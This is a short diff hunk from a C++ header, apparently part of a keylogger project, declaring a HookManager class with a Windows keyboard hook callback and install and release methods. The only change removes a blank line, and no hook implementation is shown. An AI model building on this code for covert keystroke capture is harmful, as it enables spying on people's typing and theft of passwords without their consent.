@@ -9,7 +9,6 @@ typedef LRESULT(__stdcall *HookCallback)(int, WPARAM, LPARAM);
 
 class HookManager {
 public:
-    
     static LRESULT __stdcall ListenerHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
     static void InstallKeyboardHook(Keylogger* keylogger);
     static void ReleaseHook();
